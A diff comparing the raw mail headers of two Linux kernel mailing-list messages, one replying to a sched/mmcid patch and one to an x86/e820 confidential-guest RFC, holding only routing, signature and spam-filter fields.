@@ -1,36 +1,36 @@
 Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id DA25E606A329
-	for <linux-mm@archiver.kernel.org>; Tue, 24 Nov 2026 17:28:17 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 391E1606A329
+	for <linux-mm@archiver.kernel.org>; Tue, 24 Nov 2026 17:28:20 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=bSNRU5Fo
+	dkim=pass (1024-bit key, unprotected) header.d=amd.com header.i=@amd.com header.a=rsa-sha256 header.s=selector1 header.b=cvbCY3wk
 Received: by kanga.kvack.org (Postfix)
-	id 0660B6B07F9; Tue, 24 Nov 2026 12:28:17 -0500 (EST)
+	id 8084D6B07FB; Tue, 24 Nov 2026 12:28:17 -0500 (EST)
 Received: by kanga.kvack.org (Postfix, from userid 40)
-	id 03E396B07FB; Tue, 24 Nov 2026 12:28:16 -0500 (EST)
+	id 790B36B07FD; Tue, 24 Nov 2026 12:28:17 -0500 (EST)
 X-Delivered-To: int-list-linux-mm@kvack.org
 Received: by kanga.kvack.org (Postfix, from userid 63042)
-	id E6ED66B07FC; Tue, 24 Nov 2026 12:28:16 -0500 (EST)
+	id 6585A6B07FE; Tue, 24 Nov 2026 12:28:17 -0500 (EST)
 X-Delivered-To: linux-mm@kvack.org
-Received: from relay.hostedemail.com (smtprelay0010.hostedemail.com [216.40.44.10])
-	by kanga.kvack.org (Postfix) with ESMTP id B50CC6B07F9
-	for <linux-mm@kvack.org>; Tue, 24 Nov 2026 12:28:16 -0500 (EST)
-Received: from smtpin20.hostedemail.com (lb01a-stub [10.200.18.249])
-	by unirelay10.hostedemail.com (Postfix) with ESMTP id BB61FC0C28
-	for <linux-mm@kvack.org>; Tue, 24 Nov 2026 17:28:15 +0000 (UTC)
-X-FDA: 85470696150.20.1DAD2BC
-Received: from mail-ej1-f48.google.com (mail-ej1-f48.google.com [209.85.218.48])
-	by imf17.hostedemail.com (Postfix) with ESMTP id B508740010
+Received: from relay.hostedemail.com (smtprelay0017.hostedemail.com [216.40.44.17])
+	by kanga.kvack.org (Postfix) with ESMTP id 34CBC6B07FB
+	for <linux-mm@kvack.org>; Tue, 24 Nov 2026 12:28:17 -0500 (EST)
+Received: from smtpin11.hostedemail.com (lb01a-stub [10.200.18.249])
+	by unirelay07.hostedemail.com (Postfix) with ESMTP id 95EC6160566
+	for <linux-mm@kvack.org>; Tue, 24 Nov 2026 17:28:16 +0000 (UTC)
+X-FDA: 85470696192.11.8071774
+Received: from SN4PR2101CU001.outbound.protection.outlook.com (mail-southcentralusazon11012046.outbound.protection.outlook.com [40.93.195.46])
+	by imf08.hostedemail.com (Postfix) with ESMTP id 6BA58160005
 	for <linux-mm@kvack.org>; Tue, 24 Nov 2026 17:28:13 +0000 (UTC)
-Authentication-Results: imf17.hostedemail.com;
-	dkim=pass header.d=gmail.com header.s=20260707 header.b=bSNRU5Fo;
-	dmarc=pass (policy=none) header.from=gmail.com;
-	spf=pass (imf17.hostedemail.com: domain of bestswngs@gmail.com designates 209.85.218.48 as permitted sender) smtp.mailfrom=bestswngs@gmail.com;
-	arc=pass ("google.com:s=arc-20260327:i=1")
+Authentication-Results: imf08.hostedemail.com;
+	dkim=pass header.d=amd.com header.s=selector1 header.b=cvbCY3wk;
+	dmarc=pass (policy=quarantine) header.from=amd.com;
+	spf=pass (imf08.hostedemail.com: domain of Pankaj.Gupta@amd.com designates 40.93.195.46 as permitted sender) smtp.mailfrom=Pankaj.Gupta@amd.com;
+	arc=pass ("microsoft.com:s=arcselector10001:i=1")
 ARC-Seal: i=2; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=pass;
 	t=1795541293;
-	b=bbiwybL6J6O6ccwUjGjAeP2lYayLTIKV/MoC7+dEHZTsu6T9yOJFVJGW2WqdAbOxvwttyh
-	8+dVl6kiAEmnXJUmxq+MQWx/AP19/hpnZDB4R4pXBVpoP3t50SXkJJUP1uaxvNYwXCYQNL
-	F26rNEuMhN5TC/bABBvmZqpKxkhLplI=
+	b=RwUk1XE76trUb96tOKaMp70LM+sf6hnC0GtXm96LUhsgxWwKIKpFrGrd2YYsaSmPe/Hvdp
+	62Sw+4g0UnL9uFiHH+nWqWtRVRa7uqzj9e5HYVzYRWxPZoZ462cn504NJ4AUAxJxVbqm7Y
+	ftQ16NBDWkKqtg94xpSUOHr1kkrVaKs=
 ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
 	s=arc-20220608; t=1795541293;
 	h=from:from:sender:reply-to:subject:subject:date:date:
@@ -38,111 +38,145 @@ ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
 	 content-type:content-type:
 	 content-transfer-encoding:content-transfer-encoding:
 	 in-reply-to:in-reply-to:references:references:dkim-signature;
-	bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
-	b=CYELA/GYCgfg58NL9tKvn+WUX3NcHPojiLYqMcODnKLj3GsGhQv+tMwrP4CW/TcVnsDtgO
-	HzIwhGV8rlHWG3NjAfWJCAzXO0XycbzuEpZJsyP94cehDgsGlgCjCL3GvYdods9IRL2HMI
-	F+8mzC4WM/sgBDXE3rOeyBXYvAkbpGc=
+	bh=ZCwp05IcpcNS3RLWAuz6/8Sd0BXA3jsJ8MNUidlQd8g=;
+	b=bH7q195LZVpzgvtwBrM6RMLFR8u88m0/bGEYGZT8piAKLSumefchdD1pIfWb5VWZZB08fs
+	wwgy5TEdgt8sNVgRTevdKoGAbfNR/APy0jG/aKDChsEKQYEdSGBnfmsl0RRs3y8So4f41Y
+	+kvuSBpy5eE98iSqvuakfnA5s79SLv0=
 ARC-Authentication-Results: i=2;
-	imf17.hostedemail.com;
-	dkim=pass header.d=gmail.com header.s=20260707 header.b=bSNRU5Fo;
-	dmarc=pass (policy=none) header.from=gmail.com;
-	spf=pass (imf17.hostedemail.com: domain of bestswngs@gmail.com designates 209.85.218.48 as permitted sender) smtp.mailfrom=bestswngs@gmail.com;
-	arc=pass ("google.com:s=arc-20260327:i=1")
-Received: by mail-ej1-f48.google.com with SMTP id a640c23a62f3a-c516a194350so297830866b.3
-        for <linux-mm@kvack.org>; Tue, 24 Nov 2026 09:28:13 -0800 (PST)
-ARC-Seal: i=1; a=rsa-sha256; t=1795541292; cv=none;
-        d=google.com; s=arc-20260327;
-        b=X3oJqFsKEjfS8H+CXFNXhGrrE0aSn9szlAybsPmg28LvPsQieH1kvGwLqbf5US/l9n
-         N7wqsmQeGTCGmtBovYwVZ5UyOEx9eOc42xNXF6ZrdfJM3DSQjgUz/sYyUqtNZjWKDJ9N
-         g7Kqj8kVNldCFSvw3FI4UwVcUerAaThymkvZ8Z2155dKMyeRkZzKCWXyrSVTFdr7YWJ5
-         w574wvu45iPA1fd49dRZMgq18U0F5cTG7T7R/AR1NgRzWVqQxa6g+hSUjcmzTjbnfeOx
-         ThQKMPelP20LjaflDMtkJ0uxLKhkU1C0Fdj3Tbt7qg5XRhLloxCNejvWt2xyZ1z7AS6S
-         q6OQ==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
-        fh=ppkiHqAuyum8v+6lzIgw++SR3/heU1aSVdQ5pkqwMqs=;
-        b=nRUbQ01aAMAGVgjbP3s59xkzVNQKhLgrYykMl8eTuipQX8IKLuCudDLqn+ji4b5y2K
-         lkjk7rmGc03vIRB7WfRxSVua6dkuBCwOaofAZnH45gcU/ZGAw38CynEVMjPc8LL8qvCW
-         7o7nzZCcneX/7a02Fe6Nzp9Seq8wDAnVkBkLrmh3TbIlHrS6yzEl+/APVehqBpwkDYMJ
-         SARa0xGV8KiB4j303+pjGeD86czpRaw0MbUFvYRLyDOUn0MOEibjfrTtKHsdeRbbpC70
-         TbOMnvcDYC4J5t+MAmfxfD9OOEFl38iTeA8Ts9kQKmj03kNZevGW80ISCc3MCoFUz6wG
-         edMw==;
-        darn=kvack.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20260707; t=1795541292; x=1796146092; darn=kvack.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
-        b=bSNRU5FoNqYdPVWkA3UTAHgM9lcucNOhMd1M745pkhoOfpVYl+/45MO4xcG2+GgwBy
-         /DYLFCQO8/eRCW3XWMOW4bNYvkQvJkOCIltSc8JjdVjBd6fOljs81iTAM22TjGlmWFRR
-         ZeB8Qw2mL3PkcShowUWEOsrZO4014wD9Ew1mHfUtWtM80oJeff6WEsuqGcw0qulgBIUH
-         KP53ulhpVaqsfzs742c1jthOTkfcbjI1OZZpGJ+52Vh+ztATeKqGnQnGKDTkMdqHy5Sp
-         Pzia+bOTwPLcFruTgIsz5GKw2DlSEmpNOrFLQUR0CsEsjz3Dc8fFoQ7s10S/OxW1NB2L
-         5OTQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1795541292; x=1796146092;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
-        b=cWjiPPp8O4MkrEO1DqqmoaQGCmzeU0orPQB1SR+PPbQ5oDQ10YwD929xCS7JFNw/Sj
-         bS88VFqXZfdvHRq4ZdCg3PdNcQsiErn98XbtMI8iw/WzKG/GacJ3hfRgtsuxnD+pI75K
-         utP30M0Rgcg7pPeSPaRotJnTdxhgAgbxRZqafQLHmIj+e+0MP5zve9acFofIBtIjM8QC
-         dRCIn+znzRhe57KVeoXit/k7iv61Rz010JSOTOlkPI94uVqrdUruxyPCWZBk8MXcWg7d
-         TeFZwJqz26CfspUWJBul06FOBOgHx+3FJb0Dr68slb4XVbqZSG/QH/xHMTuVX44M8R9D
-         PLeQ==
-X-Forwarded-Encrypted: i=1; AL+hErFrLdZ1mPKw4looGQomo0kNALkqywBnwVJ17msMxP8kw+n5yAjAPP9tN+b772V1kwj8Pqa+dp+2/A==@kvack.org
-X-Gm-Message-State: APuU4Z8EpQ12+4EpwLZFGGOYuYSZFv17OedhhJT2b0+h4UWen3oozS/6
-	yYD6ZSei2j0MA0FCSoq1Q6bQNfCLquQS47yi1Ujkc28GQg3wLw2bfioW3O2iSwOY6maCtasqCJO
-	WcZ3FWBnbitoIivMJzEz1bHLsF817j8k=
-X-Gm-Gg: AZFdTZcHFYdjpDSEa8XigglE6wqfQduyVAnCwSwfZxzGkYk/B0Go3ceY8MaW/pw66Kh
-	U9BPuLdTQh1AmgGTzXoP1oHoKMafVlkNNrUXK6Sz5F+AQ+cEDY3aLwgw3YQUCpvxkp5OkBETlGb
-	zFM9Lk4qQW9uL0DzsidP4ChfAp7Rf9Gt2j6ZmiZiRtYHhwcL/E0uaPyvhkuzj7Zax3wl7PCj6CW
-	23Z7Zn9hlQzJJ7KsOn1SXEfmjerAhXs6iK5nNwWeL4MlRE7gCktt/mkiAZ4xsnnUUMQDR3mBfSY
-	afeP+YkQOxKr1Lt462nKebhYKACodxLnJamOB0hSYDWMnevGmjimspGhG0LmVkCh169+RgUyQ+S
-	JZ7GBrIil1djqTxyzaY2+SCfcHBcrvSYfgk3KzbuA19OlZhp/MyLLiqviS4jhkZ5VxI2JOQ==
-X-Received: by 2002:a17:906:da0e:b0:c50:5186:6dc2 with SMTP id
- a640c23a62f3a-c513a84a4b7mr898157466b.24.1795541291905; Tue, 24 Nov 2026
- 09:28:11 -0800 (PST)
+	imf08.hostedemail.com;
+	dkim=pass header.d=amd.com header.s=selector1 header.b=cvbCY3wk;
+	dmarc=pass (policy=quarantine) header.from=amd.com;
+	spf=pass (imf08.hostedemail.com: domain of Pankaj.Gupta@amd.com designates 40.93.195.46 as permitted sender) smtp.mailfrom=Pankaj.Gupta@amd.com;
+	arc=pass ("microsoft.com:s=arcselector10001:i=1")
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=lQBqZWuegtoEJQQ/nzfe7AHYhviQVncqUhnyncdEv9nZncNNnwHv8Ud4/h8xWdUZ/0l0sOJotjSESL701CSmmczS9nmLzNkYjTupE/Lhy2kdDAqzIr7msNvjzJJLt1RMog4XJgwjIufX8wnzgVW8I/ROVnM4VG2kKVfL/aJzjLobqq3hf5MlkMLIvt8QasQKVsIpLvN33VVEzH+WJ+acYxOfsCZ1wnNQ2X7EIAq9CbJ+1q89MQB4wT369XmY6+fhF8zzj4aX4YDHsJa0+TQS32ycuVwfM/CPzump6H8D0C9FpULEpYgcOisXghHc1qidQK7FznPnJHLjyjwv1He5iw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=ZCwp05IcpcNS3RLWAuz6/8Sd0BXA3jsJ8MNUidlQd8g=;
+ b=pXdykWLFfte7EkgpEDQee2sJBUk1psB0UX7tGRHhpFX9HiDeaNWx4ZQfpqSlesaXZlGzakxt9lfx98//EaSzn0x0ZLx5Ycvb/5ePmSIJojyLSVf9yO0QZHAe/rx1kMZNnLpDizCJhMWHJze1PTYQ/N/u4SvA1vKe5K6ULqSEzJ7cT3CykT38uDnQeaseZsUj2WWjKXrjx0hW4Ngc6H0hnB+oXpNFqAacHe+tRTyIBdbR4/xqp7MH9vYYnmiFk0m5Y4XxDS5eVMhg0K6R9lk0oAp87/JAhVhkBL2Nfq/Kl+5zsZrJBuyiJ4GLzB8uyuWo9QSBs9pZpasZj+Q/6kLMEg==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=amd.com; dmarc=pass action=none header.from=amd.com; dkim=pass
+ header.d=amd.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=amd.com; s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=ZCwp05IcpcNS3RLWAuz6/8Sd0BXA3jsJ8MNUidlQd8g=;
+ b=cvbCY3wkLE3hai4NK5Oir+8evhdhh3ekVxtQo2BuPXSKBEdAynkwPsw4J7zYNETeykZwCyuLWW4FBibd1CV4CONM/Q/GQJT4emYiX3g3s8C6e28bvE4VlWZb/X+3WGOCjxd06DXogGynHok85snWbcQ62to4hIvNhZUXXsZ6BBo=
+Received: from DS0PR12MB7771.namprd12.prod.outlook.com (2603:10b6:8:138::6) by
+ PH0PR12MB8823.namprd12.prod.outlook.com (2603:10b6:510:28e::22) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.639.13; Tue, 24 Nov
+ 2026 17:28:02 +0000
+Received: from DS0PR12MB7771.namprd12.prod.outlook.com
+ ([fe80::9a3e:791f:33b6:3d8c]) by DS0PR12MB7771.namprd12.prod.outlook.com
+ ([fe80::9a3e:791f:33b6:3d8c%4]) with mapi id 15.21.0639.011; Tue, 24 Nov 2026
+ 17:28:01 +0000
+Message-ID: <f059498b-1e65-48cb-bc40-62323e161a14@amd.com>
+Date: Tue, 24 Nov 2026 18:27:55 +0100
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH RFC 0/3] x86/e820: Ignore memmap= and mem= in confidential
+ guests
+To: Ard Biesheuvel <ardb@kernel.org>, Mike Rapoport <rppt@kernel.org>,
+ Dave Hansen <dave.hansen@intel.com>
+Cc: Thomas Gleixner <tglx@kernel.org>, Ingo Molnar <mingo@redhat.com>,
+ Borislav Petkov <bp@alien8.de>, Dave Hansen <dave.hansen@linux.intel.com>,
+ x86@kernel.org, "H . Peter Anvin" <hpa@zytor.com>,
+ Tom Lendacky <thomas.lendacky@amd.com>,
+ "Kiryl Shutsemau (Meta)" <kas@kernel.org>,
+ Ilias Apalodimas <ilias.apalodimas@linaro.org>,
+ linux-kernel@vger.kernel.org, linux-mm@kvack.org, linux-efi@vger.kernel.org,
+ Pankaj.gupta.linux@gmail.com
+References: <20261124133241.221719-1-pankaj.gupta@amd.com>
+ <e08f2321-749e-40f6-9ed4-3dba8e1625ba@intel.com>
+ <awWzrkLxfQ2_ODKe@kernel.org>
+ <2dd40d0d-2e1f-4a7f-ba65-2cceccd82028@intel.com>
+ <awW31hUpXuujSAXA@kernel.org>
+ <c0e82936-9436-45e4-a8b6-07bdaa9680df@app.fastmail.com>
+Content-Language: en-US
+From: "Gupta, Pankaj" <pankaj.gupta@amd.com>
+In-Reply-To: <c0e82936-9436-45e4-a8b6-07bdaa9680df@app.fastmail.com>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
+X-ClientProxiedBy: FR4P281CA0223.DEUP281.PROD.OUTLOOK.COM
+ (2603:10a6:d10:e4::6) To DS0PR12MB7771.namprd12.prod.outlook.com
+ (2603:10b6:8:138::6)
 X-Archived-By: <archiver.kernel.org>
 MIME-Version: 1.0
-References: <20261110183809.3308868-1-bestswngs@gmail.com> <20261110183809.3308868-2-bestswngs@gmail.com>
- <3d4c5808-dff4-4d5d-aab3-684eb8a9139b@efficios.com>
-In-Reply-To: <3d4c5808-dff4-4d5d-aab3-684eb8a9139b@efficios.com>
-From: Weiming Shi <bestswngs@gmail.com>
-Date: Tue, 24 Nov 2026 09:27:34 -0800
-X-Gm-Features: Aa3M54rf5Ot-8KPAbMAj1Dp2BZXpb3N_CUZJrtz2hUjizqZ6wSfR37UszFqRCEw
-Message-ID: <CANgPUi2EtQxVR71WMPx3mQ+wrPwW1OC6CwOht1YK=E_quTHrhQ@mail.gmail.com>
-Subject: Re: [PATCH v3] sched/mmcid: Synchronize MM teardown with affinity updates
-To: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
-Cc: Kees Cook <kees@kernel.org>, Alexander Viro <viro@zeniv.linux.org.uk>, 
-	Christian Brauner <brauner@kernel.org>, Jan Kara <jack@suse.cz>, Ingo Molnar <mingo@redhat.com>, 
-	Peter Zijlstra <peterz@infradead.org>, Juri Lelli <juri.lelli@redhat.com>, 
-	Vincent Guittot <vincent.guittot@linaro.org>, Dietmar Eggemann <dietmar.eggemann@arm.com>, 
-	Steven Rostedt <rostedt@goodmis.org>, Ben Segall <bsegall@google.com>, Mel Gorman <mgorman@suse.de>, 
-	Valentin Schneider <vschneid@redhat.com>, K Prateek Nayak <kprateek.nayak@amd.com>, 
-	Thomas Gleixner <tglx@kernel.org>, linux-mm@kvack.org, linux-fsdevel@vger.kernel.org, 
-	linux-kernel@vger.kernel.org, Xiang Mei <xmei5@asu.edu>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: DS0PR12MB7771:EE_|PH0PR12MB8823:EE_
+X-MS-Office365-Filtering-Correlation-Id: f6d74bef-9f31-47d3-f930-08df4a504a44
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam:
+	BCL:0;ARA:13230040|366016|7416014|376014|23010399003|1800799024|5023799004|10067099003|261026140227099003|4143699003|11063799006|56012099006|261026121527099003|261021121427099003|261102123227099003|261022075727099003|261022105027099003|261028144727099003|22082099003|18002099003|6133799003;
+X-Microsoft-Antispam-Message-Info:
+	14pARPdHgRclmWCsXClL9wdGqB8IrYD4nZi/+DLf2X847fpR54jia0BU0pt5IB6TOOJRE1PwG9GfO2hiIYP9cSXw6jg7vPfnA1ttbfY0OmfrrQxc0Fq4lmQJgKzVcSg8IP0+b91d2SG1InQh+vZ6ObD3nGitUAV3UxttKAhNBm3y5DDw3LKU0qtR6xamWZ7Eo2gYWfBPLSlc6BWC9doQMd68etNEv0QFA7OcD/SLn9rpv77GnC9skZC25lhxYtRB7Zoyb6uVgySiY8Jz4jeIscQYeL0Ahb/bmozWMw2e46vneplw0u83DmFxdmx6rK62IgKUzezH24cVPXyRDC9aP0V9Cd4iecrbPy15E/ccUTpxa4217StbUBtyWlmWeidPncIbxxWuVgo4Vw4/JJXhcEZqqMPLbTC6gV79oQCyPSb81oZ/k6VsBpiifzAqbZIEIxKZvWs9NbAxk7xjXci/4t0FkNxrfoxPgs/dNrAmOf/y0rNEn8mU9QsO2yqsrXVVgXP8tQ2WeIXPYYg1XaqS7BrX8YAOyqUfMwNJs0s4DpGmST/PJEr5eshaYhAi0IVwhGUesAM1hhNKTQNrTJimea/lv0A0dJyZdStjZ/3/UsqrdTP8zTDSuOHEII/gs0pp
+X-Forefront-Antispam-Report:
+	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DS0PR12MB7771.namprd12.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(366016)(7416014)(376014)(23010399003)(1800799024)(5023799004)(10067099003)(261026140227099003)(4143699003)(11063799006)(56012099006)(261026121527099003)(261021121427099003)(261102123227099003)(261022075727099003)(261022105027099003)(261028144727099003)(22082099003)(18002099003)(6133799003);DIR:OUT;SFP:1101;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0:
+	=?utf-8?B?R3FiU1NvZTd5S0M0MEtneTVrOWl3bW1VMlVGblI5Ylo0NWtQUE90UkoxVnY1?=
+ =?utf-8?B?a0hKelowTVlmeVYvc3pqN3lzZWdTN3UxMnE1VkR3Y1lFN1o0TTZyT2FmcTJB?=
+ =?utf-8?B?alhHaDFIRzFzV2VBcGdnc3BHcTJTK3RwNHBnMGNtTjYyQk10MjhGMzJ0WEFB?=
+ =?utf-8?B?YXU3MXl3cTlMM1hKc0g4NDNJTUlzNWw2ZDJTQU1hTFY2RUdqejNrcWxkTUJK?=
+ =?utf-8?B?MVRTL3hQQm9ickgxZ205TWVOUzU5ZXBWdXA4V1UyR1RBd1FHS2RkMnRTQjM1?=
+ =?utf-8?B?aFRnZndyWWgzSkdVVmRHZGJ2Zjd4WTEvenlDTnNOSllVVzM5bTRsNUhaeDFv?=
+ =?utf-8?B?dGx5SS93T3A3Rk1Mcmh2a2c1V3NINWNtdjNkSUVsaHJRQlNYM3NzSUM3Rk9O?=
+ =?utf-8?B?dEllWk5jMXpvZ3owTHE3aVR6TkJxMVVUd1orU2RNcFFQMUVvVGZrei9BdTZr?=
+ =?utf-8?B?RkFSM2xmV1ZkZjZCWlBFd2ZkSDJGNW53NllBYnQrWGQ0Z2VxdzJLcEpwT21s?=
+ =?utf-8?B?RjJNM3JvVGgxaHVGaEk3SnZxZ1N0SEpGNno1cG5iTFJTYVVFbGMyV2NIY25m?=
+ =?utf-8?B?aFMvdHpmZm40Z0tzdTAvSFpteDZ0NWcyeXJmV3huU2Y5akNCeEM3eCtuQlJ3?=
+ =?utf-8?B?d01JUG5TTEZEbEZWTC9HWDJOcE9TWVRPOFowdlN2SDhVUUcyQXowYkNqTWRk?=
+ =?utf-8?B?MU5qMGQ1QW9TSkV6MG5XR1FqQVBkRW5sR2xvdnZwVkVPZHo1RHpTOTFwdW1X?=
+ =?utf-8?B?V0xjREdYRjFpTEtVUyszc2VqMUYwZGd5cWt2SHBseW1SN3JpS2dSVlhlb0RV?=
+ =?utf-8?B?T3QrdTRmbU05SkN0SmxEY0lRSHA1NEwxMVh2QTRpbGZIWGVpYkthNG9leHRB?=
+ =?utf-8?B?T3BvSmI5NWhCcW1DaDd6Wmo4WTFTVDdvOFBTM1o2dkpZMFhzTWNvMXU4OXVE?=
+ =?utf-8?B?VURDL3Q4cXF1Qkt3SDFuK0xrVlMrdVBCWjFDQUFHTlJVaHVjZERWclpaVTZY?=
+ =?utf-8?B?WHplK0lCVE81czFDYitabTc4UHRwNmVmVk1GVWVTM3RlQ0pQOWhvd1ozTlhZ?=
+ =?utf-8?B?QU1uS2xOcmtVYktJK3MzRHlvb3BnVW9BL0FUOTRYZVJqbUtiS1RlL0pXQ2I3?=
+ =?utf-8?B?cEVuWXYvUzV0U2hoS1BJNjdyTGc3NWRVYUdITitVenBHdTltcjRxdTd0TzM1?=
+ =?utf-8?B?ZHlGcDFucUM4UGVkZytuVGFOZDZPbnNOcW55aVVIdUpKMVBSOGY2SzFFb2da?=
+ =?utf-8?B?UWtXckVpVjZsZVpoR3BXaVVKcGEzOE9ZVkxBYWFUVkJ6RkVIMXNTWnZqM2Ir?=
+ =?utf-8?B?Nm5rTzU1aEc5R3B5L0p1Tm1pNVBtYWY3cUZJZnAraW43Z01EcUxQTnllejF4?=
+ =?utf-8?B?ZDBSb3g5MUU4SlcrbmNvRnlGcjJ2SUFjSFg1K2ZtSG5OU1NCcXdVSVNEWXdj?=
+ =?utf-8?B?QzhZQ2EvQVhXdEZxQ0JxRjdqY3pjcVE5elpnVDZpbFpFTU01ZDc2NHF3ZkpP?=
+ =?utf-8?B?a1lxbng4RVdGd1NTSlc3QTdzeDN0cVE5azZDU1dDRm5JR2ttYng2eFdYYXFv?=
+ =?utf-8?B?Z1QvZEEvM0E4NE9jYk92NVhSMkxTWkhGdVZoWkMvRThhWjN6T1grRkg2N2JS?=
+ =?utf-8?B?eW40aHUrc29RMy9naWZvbUJWV2pMdkV2dXk1eGlGWE5Sdi8rU2Y4YWhmL2Ur?=
+ =?utf-8?B?aTlXYzR0M0drNFRDZERGeEVvNUhmdW85MDI3ZU1ickV4Zk9mQ1VwandUNkt6?=
+ =?utf-8?B?YjVxNmxwbEd6Zi9wUVdVK3lOUVhVckJoOXdZNzRHcW1qcDRBdjZOUU5pOWxV?=
+ =?utf-8?B?TW5wd0p5R0k2VkJGbFcxejFmY2orcDRxdjM3dXBXTEhOU053eVZQSkxCQnZ0?=
+ =?utf-8?B?TkZQeFl1ODhYOHFTazJNRmZKR09sSEVYKzBud0p2akpJLzdRZzFtK3Y4QlIw?=
+ =?utf-8?B?SWY3SnJaM1FuTW1OMDNFajRDRk91ZEZGQjFMVlkzejRsK2dTRTFWUVVuZXV6?=
+ =?utf-8?B?VGlTVENyRlczTkZkbmdaQ2MzcWdzYS9kYjdoc09JNGd1QTRGdnpYeUFUUmV5?=
+ =?utf-8?B?eUk3amhGNmZrZWxYdlRDY1YxZDhwSFI0M2d5ZG5ybFhUMERtZVFQZ0hxTE1o?=
+ =?utf-8?B?cmo4TG5kdDNlbTFVNnNTUmVWQ05Ka1JaaE4rc25lNTFwODNwbjFra1hGYStG?=
+ =?utf-8?B?ckRRQnB0Smg0Mlphd0pRR1ZjTFc4V1dQVlBSQ1VsS3FMWlFKZjFDNThpQXpF?=
+ =?utf-8?B?cmk3dG4zMmkzNnFKaU5Qa3lEaDYrRUYrdDBkTnpSTGMvaWl4RzJubFREQTVE?=
+ =?utf-8?B?My9hWGd3WHdJbUJDcEFsR0kvTzMyT3cralZqRXN1Z0NxMzRmYnFuQT09?=
+X-OriginatorOrg: amd.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: f6d74bef-9f31-47d3-f930-08df4a504a44
+X-MS-Exchange-CrossTenant-AuthSource: DS0PR12MB7771.namprd12.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 24 Nov 2026 17:28:01.7079
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 3dd8961f-e488-4e60-8e11-a82d994e183d
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: P0CymmQFL1KDF/rylAkxan7VWsJSlyILdAPzWbpcUt0mBK0gb9b7mn2gYQDOf55C+XlE4z3tVhHGmLpWFuROJQ==
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH0PR12MB8823
 X-Rspam-User:
 X-Rspamd-Server: rspam05
-X-Rspamd-Queue-Id: B508740010
-X-Spam-Status: No, score=0.7 required=3.0 tests=BAYES_00,DKIM_SIGNED,
-	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
-	FROM_LOCAL_NOVOWEL,HEADER_FROM_DIFFERENT_DOMAINS,LOTS_OF_MONEY,
-	MAILING_LIST_MULTI,SPF_HELO_PASS,SPF_PASS autolearn=no
-	autolearn_force=no version=4.0.1
-X-Stat-Signature: 3u8kqof9e7c5rw5h5sut46ytz796xbxq
-X-HE-Tag: 1795541293-414816
